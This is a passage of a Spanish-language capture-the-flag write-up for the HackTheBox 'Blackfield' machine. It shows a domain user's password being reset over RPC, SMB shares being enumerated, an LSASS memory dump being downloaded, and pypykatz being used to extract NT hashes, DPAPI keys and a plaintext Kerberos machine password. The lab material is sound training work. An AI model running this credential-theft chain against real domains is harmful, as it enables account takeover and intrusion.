-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound net rpc password audit2020 <span class="nt">-U</span> <span class="s1">'support'</span> <span class="nt">-S</span> 10.129.23.192
-Enter new password <span class="k">for </span>audit2020:
-Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>upport]:
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a validar con <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound crackmapexec smb 10.129.23.192 <span class="nt">-u</span> <span class="s1">'audit2020'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!z'</span>
-SMB         10.129.23.192   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         10.129.23.192   445    DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\a</span>udit2020:miguel123<span class="nv">$!</span>z
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a validar los recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound smbmap <span class="nt">-H</span> 10.129.23.192 <span class="nt">-u</span> <span class="s1">'audit2020'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!z'</span> <span class="nt">--no-banner</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
-
-<span class="o">[</span>+] IP: 10.129.23.192:445	Name: BLACKFIELD.local    	Status: Authenticated
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
-	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
-	forensic                                          	READ ONLY	Forensic / Audit share.
-	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
-	NETLOGON                                          	READ ONLY	Logon server share
-	profiles<span class="nv">$ </span>                                        	READ ONLY	
-	SYSVOL                                            	READ ONLY	Logon server share
-</code></pre></div></div>
-
-<ul>
-  <li>Tenemos acceso a un directorio interesante <code class="language-plaintext highlighter-rouge">Forensic / Audit share</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound smbmap <span class="nt">-H</span> 10.129.23.192 <span class="nt">-u</span> <span class="s1">'audit2020'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!z'</span> <span class="nt">-r</span> forensic <span class="nt">--no-banner</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
-
-<span class="o">[</span>+] IP: 10.129.23.192:445	Name: BLACKFIELD.local    	Status: Authenticated
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
-	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
-	forensic                                          	READ ONLY	Forensic / Audit share.
-	./forensic
-	dr--r--r--                0 Sun Feb 23 09:10:16 2020	<span class="nb">.</span>
-	dr--r--r--                0 Sun Feb 23 09:10:16 2020	..
-	dr--r--r--                0 Sun Feb 23 12:14:37 2020	commands_output
-	dr--r--r--                0 Thu May 28 15:29:24 2020	memory_analysis
-	dr--r--r--                0 Fri Feb 28 16:30:34 2020	tools
-	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
-	NETLOGON                                          	READ ONLY	Logon server share
-	profiles<span class="nv">$ </span>                                        	READ ONLY	
-	SYSVOL                                            	READ ONLY	Logon server share
-</code></pre></div></div>
-
-<ul>
-  <li>Y bueno dentro de una carpeta encontramos un <code class="language-plaintext highlighter-rouge">.zip</code> que ya es interesante <code class="language-plaintext highlighter-rouge">lsass.zip</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound smbmap <span class="nt">-H</span> 10.129.23.192 <span class="nt">-u</span> <span class="s1">'audit2020'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!z'</span> <span class="nt">-r</span> forensic/memory_analysis <span class="nt">--no-banner</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
-
-<span class="o">[</span>+] IP: 10.129.23.192:445	Name: BLACKFIELD.local    	Status: Authenticated
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
-	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
-	forensic                                          	READ ONLY	Forensic / Audit share.
-	./forensicmemory_analysis
-	dr--r--r--                0 Thu May 28 15:29:24 2020	<span class="nb">.</span>
-	dr--r--r--                0 Thu May 28 15:29:24 2020	..
-	fr--r--r--         37876530 Thu May 28 15:29:24 2020	conhost.zip
-	fr--r--r--         24962333 Thu May 28 15:29:24 2020	ctfmon.zip
-	fr--r--r--         23993305 Thu May 28 15:29:24 2020	dfsrs.zip
-	fr--r--r--         18366396 Thu May 28 15:29:24 2020	dllhost.zip
-	fr--r--r--          8810157 Thu May 28 15:29:24 2020	ismserv.zip
-	fr--r--r--         41936098 Thu May 28 15:29:24 2020	lsass.zip
-	fr--r--r--         64288607 Thu May 28 15:29:24 2020	mmc.zip
-	fr--r--r--         13332174 Thu May 28 15:29:24 2020	RuntimeBroker.zip
-	fr--r--r--        131983313 Thu May 28 15:29:24 2020	ServerManager.zip
-	fr--r--r--         33141744 Thu May 28 15:29:24 2020	sihost.zip
-	fr--r--r--         33756344 Thu May 28 15:29:24 2020	smartscreen.zip
-	fr--r--r--         14408833 Thu May 28 15:29:24 2020	svchost.zip
-	fr--r--r--         34631412 Thu May 28 15:29:24 2020	taskhostw.zip
-	fr--r--r--         14255089 Thu May 28 15:29:24 2020	winlogon.zip
-	fr--r--r--          4067425 Thu May 28 15:29:24 2020	wlms.zip
-	fr--r--r--         18303252 Thu May 28 15:29:24 2020	WmiPrvSE.zip
-	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
-	NETLOGON                                          	READ ONLY	Logon server share
-	profiles<span class="nv">$ </span>                                        	READ ONLY	
-	SYSVOL                                            	READ ONLY	Logon server share
-</code></pre></div></div>
-
-<h2 id="shell-as-svc_backup">Shell as svc_backup</h2>
-
-<ul>
-  <li>
-    <p><a href="https://www.reviversoft.com/es/processes/lsass.exe?ncr=1">https://www.reviversoft.com/es/processes/lsass.exe?ncr=1</a>.</p>
-  </li>
-  <li>
-    <p>Vamos a descárgalo a nuestra maquina.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  bloodhound smbmap <span class="nt">-H</span> 10.129.23.192 <span class="nt">-u</span> <span class="s1">'audit2020'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!z'</span> <span class="nt">--download</span> forensic/memory_analysis/lsass.zip <span class="nt">--no-banner</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
-<span class="o">[</span>+] Starting download: forensic<span class="se">\m</span>emory_analysis<span class="se">\l</span>sass.zip <span class="o">(</span>41936098 bytes<span class="o">)</span>
-<span class="o">[</span>+] File output to: /home/miguel/Hackthebox/Blackfield/content/bloodhound/10.129.23.192-forensic_memory_analysis_lsass.zip
-</code></pre></div></div>
-
-<ul>
-  <li>Dentro tenemos el archivo importante.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content 7z l lsass.zip
-
-7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
- 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024
-
-Scanning the drive <span class="k">for </span>archives:
-1 file, 41936098 bytes <span class="o">(</span>40 MiB<span class="o">)</span>
-
-Listing archive: lsass.zip
-
-<span class="nt">--</span>
-Path <span class="o">=</span> lsass.zip
-Type <span class="o">=</span> zip
-Physical Size <span class="o">=</span> 41936098
-
-   Date      Time    Attr         Size   Compressed  Name
-<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
-2020-02-23 11:02:02 ....A    143044222     41935982  lsass.DMP
-<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
-2020-02-23 11:02:02          143044222     41935982  1 files
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a extraerlo.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip lsass.zip
-Archive:  lsass.zip
-  inflating: lsass.DMP
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Ahora podemos usar la siguiente herramienta <a href="https://sniferl4bs.com/2020/03/extrayendo-credenciales-de-un-volcado-de-memoria-de-lssas.exe-con-pypykatz/">https://sniferl4bs.com/2020/03/extrayendo-credenciales-de-un-volcado-de-memoria-de-lssas.exe-con-pypykatz/</a>.</p>
-  </li>
-  <li>
-    <p>Vamos a obtener información privilegiada.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content pypykatz lsa minidump lsass.DMP
-INFO:pypykatz:Parsing file lsass.DMP
-FILE: <span class="o">========</span> lsass.DMP <span class="o">=======</span>
-<span class="o">==</span> LogonSession <span class="o">==</span>
-authentication_id 406458 <span class="o">(</span>633ba<span class="o">)</span>
-session_id 2
-username svc_backup
-domainname BLACKFIELD
-logon_server DC01
-logon_time 2020-02-23T18:00:03.423728+00:00
-sid S-1-5-21-4194615774-2175524697-3563712290-1413
-luid 406458
-	<span class="o">==</span> MSV <span class="o">==</span>
-		Username: svc_backup
-		Domain: BLACKFIELD
-		LM: NA
-		NT: 9658d1d1dcd9250115e2205d9f48400d
-		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
-		DPAPI: a03cd8e9d30171f3cfe8caad92fef621
-	<span class="o">==</span> WDIGEST <span class="o">[</span>633ba]<span class="o">==</span>
-		username svc_backup
-		domainname BLACKFIELD
-		password None
-		password <span class="o">(</span>hex<span class="o">)</span>
-	<span class="o">==</span> Kerberos <span class="o">==</span>
-		Username: svc_backup
-		Domain: BLACKFIELD.LOCAL
-	<span class="o">==</span> WDIGEST <span class="o">[</span>633ba]<span class="o">==</span>
-		username svc_backup
-		domainname BLACKFIELD
-		password None
-		password <span class="o">(</span>hex<span class="o">)</span>
-
-<span class="o">==</span> LogonSession <span class="o">==</span>
-authentication_id 365835 <span class="o">(</span>5950b<span class="o">)</span>
-session_id 2
-username UMFD-2
-domainname Font Driver Host
-logon_server
-logon_time 2020-02-23T17:59:38.218491+00:00
-sid S-1-5-96-0-2
-luid 365835
-	<span class="o">==</span> MSV <span class="o">==</span>
-		Username: DC01<span class="err">$</span>
-		Domain: BLACKFIELD
-		LM: NA
-		NT: b624dc83a27cc29da11d9bf25efea796
-		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
-		DPAPI: NA
-	<span class="o">==</span> WDIGEST <span class="o">[</span>5950b]<span class="o">==</span>
-		username DC01<span class="err">$</span>
-		domainname BLACKFIELD
-		password None
-		password <span class="o">(</span>hex<span class="o">)</span>
-	<span class="o">==</span> Kerberos <span class="o">==</span>
-		Username: DC01<span class="err">$</span>
-		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu<span class="sb">`</span>Ql<span class="p">;</span>gvEE!f<span class="nv">$DoO0F</span>+,gP@P<span class="sb">`</span>fra<span class="sb">`</span>z4&amp;G3K<span class="s1">'mH:&amp;'</span>K^SW<span class="nv">$FNWWx7J</span><span class="nt">-N</span><span class="nv">$^</span><span class="s1">'bzB1Duc3^Ez]En kh`b'</span>YSV7Ml#@G3@<span class="k">*</span><span class="o">(</span>b<span class="nv">$]</span>j%#L^[Q<span class="sb">`</span>nCP<span class="s1">'&lt;Vb0I6
-		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
-	== WDIGEST [5950b]==
-		username DC01$
-		domainname BLACKFIELD
-		password None
-		password (hex)
-
-== LogonSession ==
-authentication_id 365493 (593b5)
-session_id 2
-username UMFD-2
-domainname Font Driver Host
-logon_server
-logon_time 2020-02-23T17:59:38.200147+00:00
-sid S-1-5-96-0-2
-luid 365493
-	== MSV ==
-		Username: DC01$
-		Domain: BLACKFIELD
-		LM: NA
-		NT: b624dc83a27cc29da11d9bf25efea796
-		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
-		DPAPI: NA
-	== WDIGEST [593b5]==
-		username DC01$
-		domainname BLACKFIELD
-		password None
-		password (hex)
-	== Kerberos ==
-		Username: DC01$
-		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'</span>mH:&amp;<span class="s1">'K^SW$FNWWx7J-N$^'</span>bzB1Duc3^Ez]En kh<span class="sb">`</span>b<span class="s1">'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'</span>&lt;Vb0I6
-		password <span class="o">(</span>hex<span class="o">)</span>260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
-	<span class="o">==</span> WDIGEST <span class="o">[</span>593b5]<span class="o">==</span>
-		username DC01<span class="err">$</span>
-		domainname BLACKFIELD
-		password None
-		password <span class="o">(</span>hex<span class="o">)</span>
-
-<span class="o">==</span> LogonSession <span class="o">==</span>
-authentication_id 257142 <span class="o">(</span>3ec76<span class="o">)</span>
-session_id 0
-username DC01<span class="err">$</span>
-domainname BLACKFIELD
-logon_server
-logon_time 2020-02-23T17:59:13.318909+00:00
-sid S-1-5-18
-luid 257142
-	<span class="o">==</span> Kerberos <span class="o">==</span>
-		Username: DC01<span class="err">$</span>
-		Domain: BLACKFIELD.LOCAL
-
-<span class="o">==</span> LogonSession <span class="o">==</span>
-authentication_id 153705 <span class="o">(</span>25869<span class="o">)</span>
-session_id 1
-username Administrator
-domainname BLACKFIELD
-logon_server DC01
-logon_time 2020-02-23T17:59:04.506080+00:00
-sid S-1-5-21-4194615774-2175524697-3563712290-500
-luid 153705
-	<span class="o">==</span> MSV <span class="o">==</span>
-		Username: Administrator
-		Domain: BLACKFIELD
-		LM: NA
-		NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
-		SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
-		DPAPI: 240339f898b6ac4ce3f34702e4a89550
-	<span class="o">==</span> WDIGEST <span class="o">[</span>25869]<span class="o">==</span>
-		username Administrator
-		domainname BLACKFIELD
-		password None
-		password <span class="o">(</span>hex<span class="o">)</span>
-	<span class="o">==</span> Kerberos <span class="o">==</span>
-		Username: Administrator
-		Domain: BLACKFIELD.LOCAL
-	<span class="o">==</span> WDIGEST <span class="o">[</span>25869]<span class="o">==</span>
-		username Administrator
-		domainname BLACKFIELD
-		password None
-		password <span class="o">(</span>hex<span class="o">)</span>
-	<span class="o">==</span> DPAPI <span class="o">[</span>25869]<span class="o">==</span>
-		luid 153705
-		key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e
-		masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5
-		sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9
-
-<span class="o">==</span> LogonSession <span class="o">==</span>
-authentication_id 137110 <span class="o">(</span>21796<span class="o">)</span>
-session_id 0
-username DC01<span class="err">$</span>
-domainname BLACKFIELD
-logon_server
-logon_time 2020-02-23T17:58:27.068590+00:00
-sid S-1-5-18
-luid 137110
-	<span class="o">==</span> Kerberos <span class="o">==</span>
-		Username: DC01<span class="err">$</span>
-		Domain: BLACKFIELD.LOCAL
-
-<span class="o">==</span> LogonSession <span class="o">==</span>
-authentication_id 134695 <span class="o">(</span>20e27<span class="o">)</span>
-session_id 0
-username DC01<span class="err">$</span>
-domainname BLACKFIELD
-logon_server
-logon_time 2020-02-23T17:58:26.678019+00:00
-sid S-1-5-18
-luid 134695
-	<span class="o">==</span> Kerberos <span class="o">==</span>
-		Username: DC01<span class="err">$</span>
-		Domain: BLACKFIELD.LOCAL
-
-<span class="o">==</span> LogonSession <span class="o">==</span>
-authentication_id 40310 <span class="o">(</span>9d76<span class="o">)</span>
-session_id 1
-username DWM-1
-domainname Window Manager
-logon_server
-logon_time 2020-02-23T17:57:46.897202+00:00
-sid S-1-5-90-0-1
-luid 40310
-	<span class="o">==</span> MSV <span class="o">==</span>
-		Username: DC01<span class="err">$</span>
-		Domain: BLACKFIELD
-		LM: NA
-		NT: b624dc83a27cc29da11d9bf25efea796
-		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
-		DPAPI: NA
-	<span class="o">==</span> WDIGEST <span class="o">[</span>9d76]<span class="o">==</span>
-		username DC01<span class="err">$</span>
-		domainname BLACKFIELD
-		password None
-		password <span class="o">(</span>hex<span class="o">)</span>
-	<span class="o">==</span> Kerberos <span class="o">==</span>
-		Username: DC01<span class="err">$</span>
-		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu<span class="sb">`</span>Ql<span class="p">;</span>gvEE!f<span class="nv">$DoO0F</span>+,gP@P<span class="sb">`</span>fra<span class="sb">`</span>z4&amp;G3K<span class="s1">'mH:&amp;'</span>K^SW<span class="nv">$FNWWx7J</span><span class="nt">-N</span><span class="nv">$^</span><span class="s1">'bzB1Duc3^Ez]En kh`b'</span>YSV7Ml#@G3@<span class="k">*</span><span class="o">(</span>b<span class="nv">$]</span>j%#L^[Q<span class="sb">`</span>nCP<span class="s1">'&lt;Vb0I6
-		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
-	== WDIGEST [9d76]==
-		username DC01$
-		domainname BLACKFIELD
-		password None
-		password (hex)
-
-== LogonSession ==
-authentication_id 40232 (9d28)
-session_id 1
-username DWM-1
-domainname Window Manager
-logon_server
-logon_time 2020-02-23T17:57:46.897202+00:00
-sid S-1-5-90-0-1
-luid 40232
-	== MSV ==
-		Username: DC01$
-		Domain: BLACKFIELD
-		LM: NA
-		NT: b624dc83a27cc29da11d9bf25efea796
-		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
-		DPAPI: NA
-	== WDIGEST [9d28]==
-		username DC01$
-		domainname BLACKFIELD
-		password None
-		password (hex)
-	== Kerberos ==
-		Username: DC01$
-		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'</span>mH:&amp;<span class="s1">'K^SW$FNWWx7J-N$^'</span>bzB1Duc3^Ez]En kh<span class="sb">`</span>b<span class="s1">'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'</span>&lt;Vb0I6
-		password <span class="o">(</span>hex<span class="o">)</span>260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
-	<span class="o">==</span> WDIGEST <span class="o">[</span>9d28]<span class="o">==</span>
-		username DC01<span class="err">$</span>
-		domainname BLACKFIELD
-		password None
-		password <span class="o">(</span>hex<span class="o">)</span>
-
-<span class="o">==</span> LogonSession <span class="o">==</span>
-authentication_id 996 <span class="o">(</span>3e4<span class="o">)</span>
-session_id 0
-username DC01<span class="err">$</span>
-domainname BLACKFIELD
-logon_server
-logon_time 2020-02-23T17:57:46.725846+00:00
-sid S-1-5-20
-luid 996
-	<span class="o">==</span> MSV <span class="o">==</span>
-		Username: DC01<span class="err">$</span>
-		Domain: BLACKFIELD
-		LM: NA
-		NT: b624dc83a27cc29da11d9bf25efea796
-		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
-		DPAPI: NA
-	<span class="o">==</span> WDIGEST <span class="o">[</span>3e4]<span class="o">==</span>
-		username DC01<span class="err">$</span>
-		domainname BLACKFIELD
-		password None
-		password <span class="o">(</span>hex<span class="o">)</span>
-	<span class="o">==</span> Kerberos <span class="o">==</span>
-		Username: dc01<span class="err">$</span>
-		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu<span class="sb">`</span>Ql<span class="p">;</span>gvEE!f<span class="nv">$DoO0F</span>+,gP@P<span class="sb">`</span>fra<span class="sb">`</span>z4&amp;G3K<span class="s1">'mH:&amp;'</span>K^SW<span class="nv">$FNWWx7J</span><span class="nt">-N</span><span class="nv">$^</span><span class="s1">'bzB1Duc3^Ez]En kh`b'</span>YSV7Ml#@G3@<span class="k">*</span><span class="o">(</span>b<span class="nv">$]</span>j%#L^[Q<span class="sb">`</span>nCP<span class="s1">'&lt;Vb0I6
-		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
-	== WDIGEST [3e4]==
-		username DC01$
-		domainname BLACKFIELD
-		password None
-		password (hex)
-
-== LogonSession ==
-authentication_id 24410 (5f5a)
-session_id 1
-username UMFD-1
-domainname Font Driver Host
-logon_server
-logon_time 2020-02-23T17:57:46.569111+00:00
-sid S-1-5-96-0-1
-luid 24410
-	== MSV ==
-		Username: DC01$
-		Domain: BLACKFIELD
-		LM: NA
-		NT: b624dc83a27cc29da11d9bf25efea796
-		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
-		DPAPI: NA
-	== WDIGEST [5f5a]==
-		username DC01$
-		domainname BLACKFIELD
-		password None
-		password (hex)
-	== Kerberos ==
-		Username: DC01$
-		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'</span>mH:&amp;<span class="s1">'K^SW$FNWWx7J-N$^'</span>bzB1Duc3^Ez]En kh<span class="sb">`</span>b<span class="s1">'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'</span>&lt;Vb0I6
-		password <span class="o">(</span>hex<span class="o">)</span>260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
-	<span class="o">==</span> WDIGEST <span class="o">[</span>5f5a]<span class="o">==</span>
-		username DC01<span class="err">$</span>
-		domainname BLACKFIELD
-		password None
-		password <span class="o">(</span>hex<span class="o">)</span>
-
-<span class="o">==</span> LogonSession <span class="o">==</span>
-authentication_id 406499 <span class="o">(</span>633e3<span class="o">)</span>
-session_id 2
-username svc_backup
-domainname BLACKFIELD
-logon_server DC01
-logon_time 2020-02-23T18:00:03.423728+00:00
-sid S-1-5-21-4194615774-2175524697-3563712290-1413
-luid 406499
-	<span class="o">==</span> MSV <span class="o">==</span>
-		Username: svc_backup
-		Domain: BLACKFIELD
-		LM: NA
-		NT: 9658d1d1dcd9250115e2205d9f48400d
-		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
-		DPAPI: a03cd8e9d30171f3cfe8caad92fef621
-	<span class="o">==</span> WDIGEST <span class="o">[</span>633e3]<span class="o">==</span>
-		username svc_backup
-		domainname BLACKFIELD
-		password None
-		password <span class="o">(</span>hex<span class="o">)</span>
-	<span class="o">==</span> Kerberos <span class="o">==</span>
-		Username: svc_backup
-		Domain: BLACKFIELD.LOCAL
-	<span class="o">==</span> WDIGEST <span class="o">[</span>633e3]<span class="o">==</span>
-		username svc_backup
-		domainname BLACKFIELD
-		password None
-		password <span class="o">(</span>hex<span class="o">)</span>
-	<span class="o">==</span> DPAPI <span class="o">[</span>633e3]<span class="o">==</span>
-		luid 406499
-		key_guid 836e8326-d136-4b9f-94c7-3353c4e45770
-		masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf
-		sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991
-
-<span class="o">==</span> LogonSession <span class="o">==</span>
-authentication_id 366665 <span class="o">(</span>59849<span class="o">)</span>
-session_id 2
-username DWM-2
-domainname Window Manager
-logon_server
-logon_time 2020-02-23T17:59:38.293877+00:00
-sid S-1-5-90-0-2
-luid 366665
-	<span class="o">==</span> MSV <span class="o">==</span>
-		Username: DC01<span class="err">$</span>
-		Domain: BLACKFIELD
-		LM: NA
-		NT: b624dc83a27cc29da11d9bf25efea796
-		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
-		DPAPI: NA
-	<span class="o">==</span> WDIGEST <span class="o">[</span>59849]<span class="o">==</span>
-		username DC01<span class="err">$</span>
-		domainname BLACKFIELD
-		password None
-		password <span class="o">(</span>hex<span class="o">)</span>
-	<span class="o">==</span> Kerberos <span class="o">==</span>
-		Username: DC01<span class="err">$</span>
-		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu<span class="sb">`</span>Ql<span class="p">;</span>gvEE!f<span class="nv">$DoO0F</span>+,gP@P<span class="sb">`</span>fra<span class="sb">`</span>z4&amp;G3K<span class="s1">'mH:&amp;'</span>K^SW<span class="nv">$FNWWx7J</span><span class="nt">-N</span><span class="nv">$^</span><span class="s1">'bzB1Duc3^Ez]En kh`b'</span>YSV7Ml#@G3@<span class="k">*</span><span class="o">(</span>b<span class="nv">$]</span>j%#L^[Q<span class="sb">`</span>nCP<span class="s1">'&lt;Vb0I6
-		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
-	== WDIGEST [59849]==
-		username DC01$
-		domainname BLACKFIELD
-		password None
-		password (hex)
-
-== LogonSession ==
-authentication_id 366649 (59839)
-session_id 2
-username DWM-2
-domainname Window Manager
-logon_server
-logon_time 2020-02-23T17:59:38.293877+00:00
-sid S-1-5-90-0-2
-luid 366649
-	== MSV ==
-		Username: DC01$
-		Domain: BLACKFIELD
-		LM: NA
-		NT: b624dc83a27cc29da11d9bf25efea796
-		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
-		DPAPI: NA
-	== WDIGEST [59839]==
-		username DC01$
-		domainname BLACKFIELD
-		password None
-		password (hex)
-	== Kerberos ==
-		Username: DC01$
-		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'</span>mH:&amp;<span class="s1">'K^SW$FNWWx7J-N$^'</span>bzB1Duc3^Ez]En kh<span class="sb">`</span>b<span class="s1">'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'</span>&lt;Vb0I6
